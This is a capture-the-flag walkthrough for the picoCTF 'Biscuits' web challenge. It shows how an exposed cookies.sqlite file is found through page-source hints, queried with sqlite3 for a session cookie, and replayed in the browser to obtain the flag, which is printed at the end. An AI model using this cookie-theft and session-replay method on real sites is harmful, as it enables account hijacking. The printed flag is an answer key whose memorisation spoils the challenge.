# Biscuits
## level 3 - web exploitation - 75 points

### Description
> Your friend has a personal website. Fortunately for you, he is a bit of a noob when it comes to hosting a website. Can you find out what he is hiding? [Website](http://shell2017.picoctf.com:30027/).

### Hints
> * Viewing the source of the website is usually a good start.

### Solution

Open the source of the website to get other hints:

```html
<!-- Storing stuff in the same directory as your web server doesn't seem like a good idea -->
<!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file -->
```

The CSS included give us the final hint about the file `cookies.sqlite` is located:

```css
body{
	background-image: url("private/image.png");
}
```

The cookies database is located in `http://shell2017.picoctf.com:30027/private/cookies.sqlite`. Download it and use `sqlite3` to get informations:

```
$ sqlite3 cookies.sqlite ".tables"
moz_cookies
```

There is just one table, lets get the schema:

```
$ sqlite3 cookies.sqlite ".schema moz_cookies"
CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, baseDomain TEXT, appId INTEGER DEFAULT 0, inBrowserElement INTEGER DEFAULT 0, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER, isSecure INTEGER, isHttpOnly INTEGER, CONSTRAINT moz_uniqueid UNIQUE (name, host, path, appId, inBrowserElement));
CREATE INDEX moz_basedomain ON moz_cookies (baseDomain, appId, inBrowserElement);
```

Now we can query just the elements we guess to be useful:

```
$ sqlite3 cookies.sqlite "SELECT id, baseDomain, value FROM moz_cookies"
1|localhost|F3MAqpWxIvESiUNLHsflVd
```

Good, we have a cookies. Open the web inspector and change the `ID` cookies property with the one found in database. Refresh the page to retrieve the flag.

### Flag
```
e5cd648b3f7e254fa0c384e6757233f7
```